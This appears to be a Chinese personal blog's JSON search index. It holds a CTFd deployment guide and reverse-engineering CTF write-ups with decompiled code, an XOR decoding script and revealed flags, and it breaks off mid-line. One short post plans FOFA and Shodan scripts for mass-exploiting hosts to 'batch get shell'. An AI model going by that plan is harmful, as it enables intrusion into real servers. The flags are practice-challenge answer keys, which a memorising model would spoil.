{"meta":{"title":"ki9mu's blog","subtitle":null,"description":"ki9mu's blog","author":"ki9mu","url":"http://ki9mu.github.io","root":"/"},"pages":[{"title":"about","date":"2018-12-12T14:14:36.000Z","updated":"2020-07-26T12:25:43.201Z","comments":false,"path":"about/index.html","permalink":"http://ki9mu.github.io/about/index.html","excerpt":"","text":"[ki9muのblog] 与&nbsp; ki9mu&nbsp; （ ） 对话中... bot_ui_ini()"},{"title":"bangumi","date":"2019-02-10T13:32:48.000Z","updated":"2020-03-16T10:41:30.000Z","comments":false,"path":"bangumi/index.html","permalink":"http://ki9mu.github.io/bangumi/index.html","excerpt":"","text":""},{"title":"donate","date":"2018-12-20T15:13:05.000Z","updated":"2020-03-16T10:41:30.000Z","comments":false,"path":"donate/index.html","permalink":"http://ki9mu.github.io/donate/index.html","excerpt":"","text":""},{"title":"client","date":"2018-12-20T15:13:35.000Z","updated":"2020-03-16T10:41:30.000Z","comments":false,"path":"client/index.html","permalink":"http://ki9mu.github.io/client/index.html","excerpt":"","text":"直接下载 or 扫码下载："},{"title":"comment","date":"2018-12-20T15:13:48.000Z","updated":"2020-03-16T10:41:30.000Z","comments":true,"path":"comment/index.html","permalink":"http://ki9mu.github.io/comment/index.html","excerpt":"","text":"念两句诗 叙别梦、扬州一觉。 【宋代】吴文英《夜游宫·人去西楼雁杳》"},{"title":"links","date":"2018-12-19T15:11:06.000Z","updated":"2020-07-26T11:52:12.342Z","comments":true,"path":"links/index.html","permalink":"http://ki9mu.github.io/links/index.html","excerpt":"","text":""},{"title":"lab","date":"2019-01-05T13:47:59.000Z","updated":"2020-03-16T10:41:30.000Z","comments":false,"path":"lab/index.html","permalink":"http://ki9mu.github.io/lab/index.html","excerpt":"","text":"sakura主题balabala"},{"title":"music","date":"2018-12-20T15:14:28.000Z","updated":"2020-03-16T10:41:30.000Z","comments":false,"path":"music/index.html","permalink":"http://ki9mu.github.io/music/index.html","excerpt":"","text":""},{"title":"tags","date":"2018-12-12T14:14:16.000Z","updated":"2020-07-27T14:53:17.719Z","comments":true,"path":"tags/index.html","permalink":"http://ki9mu.github.io/tags/index.html","excerpt":"","text":"123"},{"title":"rss","date":"2018-12-20T15:09:03.000Z","updated":"2020-03-16T10:41:30.000Z","comments":true,"path":"rss/index.html","permalink":"http://ki9mu.github.io/rss/index.html","excerpt":"","text":""},{"title":"theme-sakura","date":"2019-01-04T14:53:25.000Z","updated":"2020-03-16T10:41:30.000Z","comments":false,"path":"theme-sakura/index.html","permalink":"http://ki9mu.github.io/theme-sakura/index.html","excerpt":"","text":"Hexo主题Sakura修改自WordPress主题Sakura，感谢原作者Mashiro"},{"title":"video","date":"2018-12-20T15:14:38.000Z","updated":"2020-03-16T10:41:30.000Z","comments":false,"path":"video/index.html","permalink":"http://ki9mu.github.io/video/index.html","excerpt":"","text":"var videos = [ { img: 'https://lain.bgm.tv/pic/cover/l/0e/1e/218971_2y351.jpg', title: '朝花夕誓——于离别之朝束起约定之花', status: '已追完', progress: 100, jp: 'さよならの朝に約束の花をかざろう', time: '放送时间: 2018-02-24 SUN.', desc: ' 住在远离尘嚣的土地，一边将每天的事情编织成名为希比欧的布，一边静静生活的伊欧夫人民。在15岁左右外表就停止成长，拥有数百年寿命的他们，被称为“离别的一族”，并被视为活着的传说。没有双亲的伊欧夫少女玛奇亚，过着被伙伴包围的平稳日子，却总感觉“孤身一人”。他们的这种日常，一瞬间就崩溃消失。追求伊欧夫的长寿之血，梅萨蒂军乘坐着名为雷纳特的古代兽发动了进攻。在绝望与混乱之中，伊欧夫的第一美女蕾莉亚被梅萨蒂带走，而玛奇亚暗恋的少年克里姆也失踪了。玛奇亚虽然总算逃脱了，却失去了伙伴和归去之地……。' }, { img : 'https://lain.bgm.tv/pic/cover/l/0e/1e/218971_2y351.jpg', title: '朝花夕誓——于离别之朝束起约定之花', status: '已追完', progress: 100, jp: 'さよならの朝に約束の花をかざろう', time: '2018-02-24 SUN.', desc: ' 住在远离尘嚣的土地，一边将每天的事情编织成名为希比欧的布，一边静静生活的伊欧夫人民。在15岁左右外表就停止成长，拥有数百年寿命的他们，被称为“离别的一族”，并被视为活着的传说。没有双亲的伊欧夫少女玛奇亚，过着被伙伴包围的平稳日子，却总感觉“孤身一人”。他们的这种日常，一瞬间就崩溃消失。追求伊欧夫的长寿之血，梅萨蒂军乘坐着名为雷纳特的古代兽发动了进攻。在绝望与混乱之中，伊欧夫的第一美女蕾莉亚被梅萨蒂带走，而玛奇亚暗恋的少年克里姆也失踪了。玛奇亚虽然总算逃脱了，却失去了伙伴和归去之地……。' } ] .should-ellipsis{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;width:95%;}.should-ellipsis-full{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;width:100%;}.should-ellipsis i{position:absolute;right:24px;}.grey-text{color:#9e9e9e !important}.grey-text.text-darken-4{color:#212121 !important}html{line-height:1.15;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}img{border-style:none}progress{display:inline-block;vertical-align:baseline}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}html{-webkit-box-sizing:border-box;box-sizing:border-box}*,*:before,*:after{-webkit-box-sizing:inherit;box-sizing:inherit}ul:not(.browser-default){padding-left:0;list-style-type:none}ul:not(.browser-default)>li{list-style-type:none}.card{-webkit-box-shadow:0 2px 2px 0 rgba(0,0,0,0.14),0 3px 1px -2px rgba(0,0,0,0.12),0 1px 5px 0 rgba(0,0,0,0.2);box-shadow:0 2px 2px 0 rgba(0,0,0,0.14),0 3px 1px -2px rgba(0,0,0,0.12),0 1px 5px 0 rgba(0,0,0,0.2)}.hoverable{-webkit-transition:-webkit-box-shadow .25s;transition:-webkit-box-shadow .25s;transition:box-shadow .25s;transition:box-shadow .25s,-webkit-box-shadow .25s}.hoverable:hover{-webkit-box-shadow:0 8px 17px 0 rgba(0,0,0,0.2),0 6px 20px 0 rgba(0,0,0,0.19);box-shadow:0 8px 17px 0 rgba(0,0,0,0.2),0 6px 20px 0 rgba(0,0,0,0.19)}i{line-height:inherit}i.right{float:right;margin-left:15px}.bangumi .right{float:right !important}.material-icons{text-rendering:optimizeLegibility;-webkit-font-feature-settings:'liga';-moz-font-feature-settings:'liga';font-feature-settings:'liga'}.row{margin-left:auto;margin-right:auto;margin-bottom:20px}.row:after{content:\"\";display:table;clear:both}.row .col{float:left;-webkit-box-sizing:border-box;box-sizing:border-box;padding:0 .75rem;min-height:1px}.row .col.s12{width:100%;margin-left:auto;left:auto;right:auto}@media only screen and (min-width:601px){.row .col.m6{width:50%;margin-left:auto;left:auto;right:auto}}html{line-height:1.5;font-family:-apple-system,BlinkMacSystemFont,\"Segoe UI\",Roboto,Oxygen-Sans,Ubuntu,Cantarell,\"Helvetica Neue\",sans-serif;font-weight:normal;color:rgba(0,0,0,0.87)}@media only screen and (min-width:0){html{font-size:14px}}@media only screen and (min-width:992px){html{font-size:14.5px}}@media only screen and (min-width:1200px){html{font-size:15px}}.card{position:relative;margin:.5rem 0 1rem 0;background-color:#fff;-webkit-transition:-webkit-box-shadow .25s;transition:-webkit-box-shadow .25s;transition:box-shadow .25s;transition:box-shadow .25s,-webkit-box-shadow .25s;border-radius:2px}.card .card-title{font-size:24px;font-weight:300}.card .card-title.activator{cursor:pointer}.card .card-image{position:relative}.card .card-image img{display:block;border-radius:2px 2px 0 0;position:relative;left:0;right:0;top:0;bottom:0;width:100%}.card .card-content{padding:24px;border-radius:0 0 2px 2px}.card .card-content p{margin:0}.card .card-content .card-title{display:block;line-height:32px;margin-bottom:8px}.card .card-content .card-title i{line-height:32px}.card .card-reveal{padding:24px;position:absolute;background-color:#fff;width:100%;overflow-y:auto;left:0;top:100%;height:100%;z-index:3;display:none}.card .card-reveal .card-title{cursor:pointer;display:block}.waves-effect{position:relative;cursor:pointer;display:inline-block;overflow:hidden;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;-webkit-tap-highlight-color:transparent;vertical-align:middle;z-index:1;-webkit-transition:.3s ease-out;transition:.3s ease-out}.waves-effect img{position:relative;z-index:-1}.waves-block{display:block}::-webkit-input-placeholder{color:#d1d1d1}::-moz-placeholder{color:#d1d1d1}:-ms-input-placeholder{color:#d1d1d1}::-ms-input-placeholder{color:#d1d1d1}[type=\"radio\"]:not(:checked){position:absolute;opacity:0;pointer-events:none}[type=\"radio\"]:not(:checked)+span{position:relative;padding-left:35px;cursor:pointer;display:inline-block;height:25px;line-height:25px;font-size:1rem;-webkit-transition:.28s ease;transition:.28s ease;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}[type=\"radio\"]:not(:checked)+span:before,[type=\"radio\"]:not(:checked)+span:after{border-radius:50%}[type=\"radio\"]:not(:checked)+span:before,[type=\"radio\"]:not(:checked)+span:after{border:2px solid #5a5a5a}[type=\"radio\"]:not(:checked)+span:after{-webkit-transform:scale(0);transform:scale(0)}[type=\"checkbox\"]:not(:checked){position:absolute;opacity:0;pointer-events:none}[type=\"checkbox\"]:not(:checked):disabled+span:not(.lever):before{border:none;background-color:rgba(0,0,0,0.42)}[type=\"checkbox\"].filled-in:not(:checked)+span:not(.lever):before{width:0;height:0;border:3px solid transparent;left:6px;top:10px;-webkit-transform:rotateZ(37deg);transform:rotateZ(37deg);-webkit-transform-origin:100% 100%;transform-origin:100% 100%}[type=\"checkbox\"].filled-in:not(:checked)+span:not(.lever):after{height:20px;width:20px;background-color:transparent;border:2px solid #5a5a5a;top:0px;z-index:0}input[type=checkbox]:not(:disabled) ~ .lever:active:before,input[type=checkbox]:not(:disabled).tabbed:focus ~ .lever::before{-webkit-transform:scale(2.4);transform:scale(2.4);background-color:rgba(0,0,0,0.08)}input[type=range].focused:focus:not(.active)::-webkit-slider-thumb{-webkit-box-shadow:0 0 0 10px rgba(38,166,154,0.26);box-shadow:0 0 0 10px rgba(38,166,154,0.26)}input[type=range].focused:focus:not(.active)::-moz-range-thumb{box-shadow:0 0 0 10px rgba(38,166,154,0.26)}input[type=range].focused:focus:not(.active)::-ms-thumb{box-shadow:0 0 0 10px rgba(38,166,154,0.26)} 番组计划 这里将是永远的回忆 window.onload = function(){ videos.forEach(function(video, i){ $('#rootRow').append(` ${video.title} ${video.jp} ${video.status} ${video.title} ${video.jp} 放送时间: ${video.time} ${video.desc} ${video.status} `) }) }"}],"posts":[{"title":"对于后期赚钱的一些思考","slug":"对于资产搜集的一些思考","date":"2020-07-29T12:29:08.000Z","updated":"2020-07-29T14:58:53.743Z","comments":true,"path":"2020/07/29/对于资产搜集的一些思考/","link":"","permalink":"http://ki9mu.github.io/2020/07/29/对于资产搜集的一些思考/","excerpt":"","text":"今天跟同事大佬有聊到挖洞的一些问题，0day方面一般还是看大厂的补丁，根据补丁来定位漏洞点，再写poc。但对于src这种，大佬今天刚挖了美团的一个洞，给了2000块，是思科的最近刚出的0day。 而前段时间跟的BIG5的漏洞，我交给了CNVD，给了我1.5个漏洞积分。跟大佬交流后大概了解到目前缺少的不是工具和方法，而是字典，是资产搜集的方式方法。 后面正在编写的fofa和shadan脚本。跟进漏洞后只需要编写exp，扫描器批量拿shell。","categories":[{"name":"生活","slug":"生活","permalink":"http://ki9mu.github.io/categories/生活/"}],"tags":[],"author":"ki9mu"},{"title":"CTFd折腾(1)","slug":"部署CTFd","date":"2019-12-21T08:56:09.000Z","updated":"2020-07-28T15:49:53.808Z","comments":true,"path":"2019/12/21/部署CTFd/","link":"","permalink":"http://ki9mu.github.io/2019/12/21/部署CTFd/","excerpt":"部署CTFd这里选择的是阿里云的轻量服务器，主要是云翼计划10块一个月。","text":"部署CTFd这里选择的是阿里云的轻量服务器，主要是云翼计划10块一个月。 安装环境ubantu 16.04安装过程这里坑其实不多，正常装一般没问题1.换源 百度一搜一大把，这里就不写了 换完了记得升级一下源 sudo apt-get update2.安装python3 apt-get install python33.安装pip sudo apt install python-pip sudo python3 -m pip install --upgrade pip4.安装git sudo apt install git5.安装Flask sudo pip install Flask6.克隆CTFd sudo git clone https://github.com/isislab/CTFd.git7.安装CTFd cd CTFd sudo ./prepare.sh8.运行CTFd sudo python serve.py此时应该会有如下代码 * Loaded module, &lt;module ‘CTFd.plugins.challenges’ from ‘/root/CTFd/CTFd/plugins/challenges/init.py’&gt; * Loaded module, &lt;module ‘CTFd.plugins.dynamic_challenges’ from ‘/root/CTFd/CTFd/plugins/dynamic_challenges/init.py’&gt; * Loaded module, &lt;module ‘CTFd.plugins.flags’ from ‘/root/CTFd/CTFd/plugins/flags/init.py’&gt; * Serving Flask app “CTFd” (lazy loading) * Environment: development * Debug mode: on * Running on http://127.0.0.1:4000/ (Press CTRL+C to quit) * Restarting with stat * Loaded module, &lt;module ‘CTFd.plugins.challenges’ from ‘/root/CTFd/CTFd/plugins/challenges/init.py’&gt; * Loaded module, &lt;module ‘CTFd.plugins.dynamic_challenges’ from ‘/root/CTFd/CTFd/plugins/dynamic_challenges/init.py’&gt; * Loaded module, &lt;module ‘CTFd.plugins.flags’ from ‘/root/CTFd/CTFd/plugins/flags/init.py’&gt; * Debugger is active! * Debugger PIN: 123-456-789 同时访问localhost:4000就能进入界面了。如果没有UI界面，新开了一个ssh，Curl访问了一下，看是否有拒绝。正常这些都没有什么问题，然后就是部署到公网了。 部署公网1.安装gunicorn sudo pip install gunicorn2.端口映射 gunicorn --bind 0.0.0.0:80 -w 10 &quot;CTFd:create_app()&quot; #在这里bind直接绑定端口80，默认是4000，也就不需要再修改阿里云的防火墙配置，安全组的配置等。 #w的参数含义是开启多少个线程，先往多里开再说。 优化虽然能够成功登录，但是页面会很卡。 nginx转发1.安装nginx sudo apt-get install nginx2.更改配置文件 vim /etc/nginx/nginx.conf #然后新增一些代码 server{ listen 80; server_name 你的ip; location / { proxy_pass http://127.0.0.1:4000; proxy_set_header Host $http_host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_redirect off; }3.重启nginx nginx -s reload4.开启服务 gunicorn --bind 0.0.0.0:80 -w 10 &quot;CTFd:create_app()&quot;此时秒进了 参考链接： https://www.cnblogs.com/qymua/p/11187624.html https://www.freebuf.com/sectool/155650.html https://www.zhaoj.in/read-6333.html https://blog.csdn.net/qq_17204441/article/details/93046872","categories":[{"name":"技术","slug":"技术","permalink":"http://ki9mu.github.io/categories/技术/"}],"tags":[]},{"title":"cyberpeace网站res刷题记录[中级]","slug":"cyberpeace网站re刷题记录-中级","date":"2019-10-10T14:01:00.000Z","updated":"2020-07-28T15:49:48.539Z","comments":true,"path":"2019/10/10/cyberpeace网站re刷题记录-中级/","link":"","permalink":"http://ki9mu.github.io/2019/10/10/cyberpeace网站re刷题记录-中级/","excerpt":"","text":"","categories":[{"name":"技术","slug":"技术","permalink":"http://ki9mu.github.io/categories/技术/"}],"tags":[]},{"title":"cyberpeace网站re刷题记录[高级]","slug":"cyberpeace网站re刷题记录-高级","date":"2019-10-10T13:55:11.000Z","updated":"2020-07-28T15:49:37.743Z","comments":true,"path":"2019/10/10/cyberpeace网站re刷题记录-高级/","link":"","permalink":"http://ki9mu.github.io/2019/10/10/cyberpeace网站re刷题记录-高级/","excerpt":"网站链接为：cyberpeace网站","text":"网站链接为：cyberpeace网站 re-200","categories":[{"name":"技术","slug":"技术","permalink":"http://ki9mu.github.io/categories/技术/"}],"tags":[]},{"title":"cyberpeace网站re刷题记录[初级]","slug":"cyberpeace网站re刷题记录-初级","date":"2019-10-06T15:44:30.000Z","updated":"2020-07-28T15:49:46.332Z","comments":true,"path":"2019/10/06/cyberpeace网站re刷题记录-初级/","link":"","permalink":"http://ki9mu.github.io/2019/10/06/cyberpeace网站re刷题记录-初级/","excerpt":"网站链接为：cyberpeace网站","text":"网站链接为：cyberpeace网站 初级 re1ida查看源码。 x32dbg动态调试 flag为：DUTCTF{We1c0met0DUTCTF} game打开程序，ida查找字符串 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667void sub_45F400()&#123; char v0; // [sp+Ch] [bp-F0h]@1 int v1; // [sp+10h] [bp-ECh]@8 int i; // [sp+DCh] [bp-20h]@6 int v3; // [sp+F4h] [bp-8h]@2 memset(&amp;v0, 0xCCu, 0xF0u); print(&quot; |------------／ --------△--------|\\n&quot;); print(&quot; |------------／ --------○--------|\\n&quot;); print(&quot; |------------／ --------◇--------|\\n&quot;); print(&quot; |------------／ --------□--------|\\n&quot;); print(&quot;|--------------------|------------／ --------☆--------|\\n&quot;); print(&quot;| |------------／ --------▽--------|\\n&quot;); print(&quot;| |------------／ -----(￣▽￣)／---|\\n&quot;); print(&quot;| |------------／ -----(;°Д°)----|\\n&quot;); print(&quot;二 |\\n&quot;); print(&quot;| by 0x61 |\\n&quot;); print(&quot;| |\\n&quot;); print(&quot;|------------------------------------------------------|\\n&quot;); print(&quot;Play a game\\nThe n is the serial number of the lamp,and m is the state of the lamp\\nIf m of the Nth lamp is 1,it&apos;s on ,if not it&apos;s off\\nAt first all the lights were closed\\n&quot;); print(&quot;Now you can input n to change its state\\n&quot;); print(&quot;But you should pay attention to one thing,if you change the state of the Nth lamp,the state of (N-1)th and (N+1)th will be changed too\\n&quot;); print(&quot;When all lamps are on,flag will appear\\n&quot;); print(&quot;Now,input n \\n&quot;); while ( 1 ) &#123; while ( 1 ) &#123; print(&quot;input n,n(1-8)\\n&quot;); sub_459418(); print(&quot;n=&quot;); sub_4596D4(&quot;%d&quot;, &amp;v3); print(&quot;\\n&quot;); if ( v3 &gt;= 0 &amp;&amp; v3 &lt;= 8 ) break; print(&quot;sorry,n error,try again\\n&quot;); &#125; if ( v3 ) &#123; sub_4576D6(v3 - 1); &#125; else &#123; for ( i = 0; i &lt; 8; ++i ) &#123; v1 = i; if ( (unsigned int)i &gt;= 9 ) sub_458919(); byte_532E28[v1] = 0; &#125; &#125; sub_4581B7(&quot;CLS&quot;); sub_458054(); if ( byte_532E28[0] == 1 &amp;&amp; byte_532E28[1] == 1 &amp;&amp; byte_532E28[2] == 1 &amp;&amp; byte_532E28[3] == 1 &amp;&amp; byte_532E28[4] == 1 &amp;&amp; byte_532E28[5] == 1 &amp;&amp; byte_532E28[6] == 1 &amp;&amp; byte_532E28[7] == 1 ) &#123; sub_457AB4(); &#125; &#125;&#125; 很明显，这里的sub_457AB4()就是运行结果。跟进 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250int sub_45E940()&#123; int v0; // edx@4 int v1; // ecx@4 char v3; // [sp+Ch] [bp-158h]@1 int i; // [sp+D0h] [bp-94h]@1 char v5; // [sp+DCh] [bp-88h]@1 char v6; // [sp+DDh] [bp-87h]@1 char v7; // [sp+DEh] [bp-86h]@1 char v8; // [sp+DFh] [bp-85h]@1 char v9; // [sp+E0h] [bp-84h]@1 char v10; // [sp+E1h] [bp-83h]@1 char v11; // [sp+E2h] [bp-82h]@1 char v12; // [sp+E3h] [bp-81h]@1 char v13; // [sp+E4h] [bp-80h]@1 char v14; // [sp+E5h] [bp-7Fh]@1 char v15; // [sp+E6h] [bp-7Eh]@1 char v16; // [sp+E7h] [bp-7Dh]@1 char v17; // [sp+E8h] [bp-7Ch]@1 char v18; // [sp+E9h] [bp-7Bh]@1 char v19; // [sp+EAh] [bp-7Ah]@1 char v20; // [sp+EBh] [bp-79h]@1 char v21; // [sp+ECh] [bp-78h]@1 char v22; // [sp+EDh] [bp-77h]@1 char v23; // [sp+EEh] [bp-76h]@1 char v24; // [sp+EFh] [bp-75h]@1 char v25; // [sp+F0h] [bp-74h]@1 char v26; // [sp+F1h] [bp-73h]@1 char v27; // [sp+F2h] [bp-72h]@1 char v28; // [sp+F3h] [bp-71h]@1 char v29; // [sp+F4h] [bp-70h]@1 char v30; // [sp+F5h] [bp-6Fh]@1 char v31; // [sp+F6h] [bp-6Eh]@1 char v32; // [sp+F7h] [bp-6Dh]@1 char v33; // [sp+F8h] [bp-6Ch]@1 char v34; // [sp+F9h] [bp-6Bh]@1 char v35; // [sp+FAh] [bp-6Ah]@1 char v36; // [sp+FBh] [bp-69h]@1 char v37; // [sp+FCh] [bp-68h]@1 char v38; // [sp+FDh] [bp-67h]@1 char v39; // [sp+FEh] [bp-66h]@1 char v40; // [sp+FFh] [bp-65h]@1 char v41; // [sp+100h] [bp-64h]@1 char v42; // [sp+101h] [bp-63h]@1 char v43; // [sp+102h] [bp-62h]@1 char v44; // [sp+103h] [bp-61h]@1 char v45; // [sp+104h] [bp-60h]@1 char v46; // [sp+105h] [bp-5Fh]@1 char v47; // [sp+106h] [bp-5Eh]@1 char v48; // [sp+107h] [bp-5Dh]@1 char v49; // [sp+108h] [bp-5Ch]@1 char v50; // [sp+109h] [bp-5Bh]@1 char v51; // [sp+10Ah] [bp-5Ah]@1 char v52; // [sp+10Bh] [bp-59h]@1 char v53; // [sp+10Ch] [bp-58h]@1 char v54; // [sp+10Dh] [bp-57h]@1 char v55; // [sp+10Eh] [bp-56h]@1 char v56; // [sp+10Fh] [bp-55h]@1 char v57; // [sp+110h] [bp-54h]@1 char v58; // [sp+111h] [bp-53h]@1 char v59; // [sp+112h] [bp-52h]@1 char v60; // [sp+113h] [bp-51h]@1 char v61; // [sp+114h] [bp-50h]@1 char v62; // [sp+120h] [bp-44h]@1 char v63; // [sp+121h] [bp-43h]@1 char v64; // [sp+122h] [bp-42h]@1 char v65; // [sp+123h] [bp-41h]@1 char v66; // [sp+124h] [bp-40h]@1 char v67; // [sp+125h] [bp-3Fh]@1 char v68; // [sp+126h] [bp-3Eh]@1 char v69; // [sp+127h] [bp-3Dh]@1 char v70; // [sp+128h] [bp-3Ch]@1 char v71; // [sp+129h] [bp-3Bh]@1 char v72; // [sp+12Ah] [bp-3Ah]@1 char v73; // [sp+12Bh] [bp-39h]@1 char v74; // [sp+12Ch] [bp-38h]@1 char v75; // [sp+12Dh] [bp-37h]@1 char v76; // [sp+12Eh] [bp-36h]@1 char v77; // [sp+12Fh] [bp-35h]@1 char v78; // [sp+130h] [bp-34h]@1 char v79; // [sp+131h] [bp-33h]@1 char v80; // [sp+132h] [bp-32h]@1 char v81; // [sp+133h] [bp-31h]@1 char v82; // [sp+134h] [bp-30h]@1 char v83; // [sp+135h] [bp-2Fh]@1 char v84; // [sp+136h] [bp-2Eh]@1 char v85; // [sp+137h] [bp-2Dh]@1 char v86; // [sp+138h] [bp-2Ch]@1 char v87; // [sp+139h] [bp-2Bh]@1 char v88; // [sp+13Ah] [bp-2Ah]@1 char v89; // [sp+13Bh] [bp-29h]@1 char v90; // [sp+13Ch] [bp-28h]@1 char v91; // [sp+13Dh] [bp-27h]@1 char v92; // [sp+13Eh] [bp-26h]@1 char v93; // [sp+13Fh] [bp-25h]@1 char v94; // [sp+140h] [bp-24h]@1 char v95; // [sp+141h] [bp-23h]@1 char v96; // [sp+142h] [bp-22h]@1 char v97; // [sp+143h] [bp-21h]@1 char v98; // [sp+144h] [bp-20h]@1 char v99; // [sp+145h] [bp-1Fh]@1 char v100; // [sp+146h] [bp-1Eh]@1 char v101; // [sp+147h] [bp-1Dh]@1 char v102; // [sp+148h] [bp-1Ch]@1 char v103; // [sp+149h] [bp-1Bh]@1 char v104; // [sp+14Ah] [bp-1Ah]@1 char v105; // [sp+14Bh] [bp-19h]@1 char v106; // [sp+14Ch] [bp-18h]@1 char v107; // [sp+14Dh] [bp-17h]@1 char v108; // [sp+14Eh] [bp-16h]@1 char v109; // [sp+14Fh] [bp-15h]@1 char v110; // [sp+150h] [bp-14h]@1 char v111; // [sp+151h] [bp-13h]@1 char v112; // [sp+152h] [bp-12h]@1 char v113; // [sp+153h] [bp-11h]@1 char v114; // [sp+154h] [bp-10h]@1 char v115; // [sp+155h] [bp-Fh]@1 char v116; // [sp+156h] [bp-Eh]@1 char v117; // [sp+157h] [bp-Dh]@1 char v118; // [sp+158h] [bp-Ch]@1 unsigned int v119; // [sp+160h] [bp-4h]@1 int savedregs; // [sp+164h] [bp+0h]@1 memset(&amp;v3, 0xCCu, 0x158u); v119 = (unsigned int)&amp;savedregs ^ __security_cookie; print(&quot;done!!! the flag is &quot;); v62 = 18; v63 = 64; v64 = 98; v65 = 5; v66 = 2; v67 = 4; v68 = 6; v69 = 3; v70 = 6; v71 = 48; v72 = 49; v73 = 65; v74 = 32; v75 = 12; v76 = 48; v77 = 65; v78 = 31; v79 = 78; v80 = 62; v81 = 32; v82 = 49; v83 = 32; v84 = 1; v85 = 57; v86 = 96; v87 = 3; v88 = 21; v89 = 9; v90 = 4; v91 = 62; v92 = 3; v93 = 5; v94 = 4; v95 = 1; v96 = 2; v97 = 3; v98 = 44; v99 = 65; v100 = 78; v101 = 32; v102 = 16; v103 = 97; v104 = 54; v105 = 16; v106 = 44; v107 = 52; v108 = 32; v109 = 64; v110 = 89; v111 = 45; v112 = 32; v113 = 65; v114 = 15; v115 = 34; v116 = 18; v117 = 16; v118 = 0; v5 = 123; v6 = 32; v7 = 18; v8 = 98; v9 = 119; v10 = 108; v11 = 65; v12 = 41; v13 = 124; v14 = 80; v15 = 125; v16 = 38; v17 = 124; v18 = 111; v19 = 74; v20 = 49; v21 = 83; v22 = 108; v23 = 94; v24 = 108; v25 = 84; v26 = 6; v27 = 96; v28 = 83; v29 = 44; v30 = 121; v31 = 104; v32 = 110; v33 = 32; v34 = 95; v35 = 117; v36 = 101; v37 = 99; v38 = 123; v39 = 127; v40 = 119; v41 = 96; v42 = 48; v43 = 107; v44 = 71; v45 = 92; v46 = 29; v47 = 81; v48 = 107; v49 = 90; v50 = 85; v51 = 64; v52 = 12; v53 = 43; v54 = 76; v55 = 86; v56 = 13; v57 = 114; v58 = 1; v59 = 117; v60 = 126; v61 = 0; for ( i = 0; i &lt; 56; ++i ) &#123; *(&amp;v5 + i) ^= *(&amp;v62 + i); *(&amp;v5 + i) ^= 0x13u; &#125; print(&quot;%s\\n&quot;); sub_459AE9(&amp;savedregs, &amp;dword_45EC04); sub_459C06(); return sub_458801(v1, v0);&#125; 本质就是v5开始，每个数亦或V62，然后赋值给v5。最后v5开始的54个数每个亦或0x13。脚本如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127import restring = &quot;&quot;&quot; v62 = 18; v63 = 64; v64 = 98; v65 = 5; v66 = 2; v67 = 4; v68 = 6; v69 = 3; v70 = 6; v71 = 48; v72 = 49; v73 = 65; v74 = 32; v75 = 12; v76 = 48; v77 = 65; v78 = 31; v79 = 78; v80 = 62; v81 = 32; v82 = 49; v83 = 32; v84 = 1; v85 = 57; v86 = 96; v87 = 3; v88 = 21; v89 = 9; v90 = 4; v91 = 62; v92 = 3; v93 = 5; v94 = 4; v95 = 1; v96 = 2; v97 = 3; v98 = 44; v99 = 65; v100 = 78; v101 = 32; v102 = 16; v103 = 97; v104 = 54; v105 = 16; v106 = 44; v107 = 52; v108 = 32; v109 = 64; v110 = 89; v111 = 45; v112 = 32; v113 = 65; v114 = 15; v115 = 34; v116 = 18; v117 = 16; v118 = 0;&quot;&quot;&quot;string2 = &quot;&quot;&quot; v5 = 123; v6 = 32; v7 = 18; v8 = 98; v9 = 119; v10 = 108; v11 = 65; v12 = 41; v13 = 124; v14 = 80; v15 = 125; v16 = 38; v17 = 124; v18 = 111; v19 = 74; v20 = 49; v21 = 83; v22 = 108; v23 = 94; v24 = 108; v25 = 84; v26 = 6; v27 = 96; v28 = 83; v29 = 44; v30 = 121; v31 = 104; v32 = 110; v33 = 32; v34 = 95; v35 = 117; v36 = 101; v37 = 99; v38 = 123; v39 = 127; v40 = 119; v41 = 96; v42 = 48; v43 = 107; v44 = 71; v45 = 92; v46 = 29; v47 = 81; v48 = 107; v49 = 90; v50 = 85; v51 = 64; v52 = 12; v53 = 43; v54 = 76; v55 = 86; v56 = 13; v57 = 114; v58 = 1; v59 = 117; v60 = 126; v61 = 0;&quot;&quot;&quot;l1 = re.compile(&quot;= (\\\\d+);&quot;).findall(string)l2 = re.compile(&quot;= (\\\\d+);&quot;).findall(string2)for i in range(0,57): l1[i] = int(l1[i])^int(l2[i])for i in range(0,57): l1[i] = int(l1[i])^0x13print(l1)print(&quot;&quot;.join(chr(i) for i in l1)) 事实上，更简单的办法是： 自己玩！！！12345678直接出结果。 helloctfida跑很明显的ascii码。flag为CrackMeJustForFun open-source直接运行 1234567891011121314151617181920212223242526272829303132333435#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main(int argc, char *argv[]) &#123; if (argc != 4) &#123; printf(&quot;what?\\n&quot;); exit(1); &#125; unsigned int first = atoi(argv[1]); if (first != 0xcafe) &#123; printf(&quot;you are wrong, sorry.\\n&quot;); exit(2); &#125; unsigned int second = atoi(argv[2]); if (second % 5 == 3 || second % 17 != 8) &#123; printf(&quot;ha, you won&apos;t get it!\\n&quot;); exit(3); &#125; if (strcmp(&quot;h4cky0u&quot;, argv[3])) &#123; printf(&quot;so close, dude!\\n&quot;); exit(4); &#125; printf(&quot;Brr wrrr grr\\n&quot;); unsigned int hash = first * 31337 + (second % 17) * 11 + strlen(argv[3]) - 1615810207; printf(&quot;Get your key: &quot;); printf(&quot;%x\\n&quot;, hash); return 0;&#125; 第一个if判断参数个数应该为4(才知道运行程序原来也算一个参数)。C:\\Users\\ki9mu\\Documents\\Visual Studio 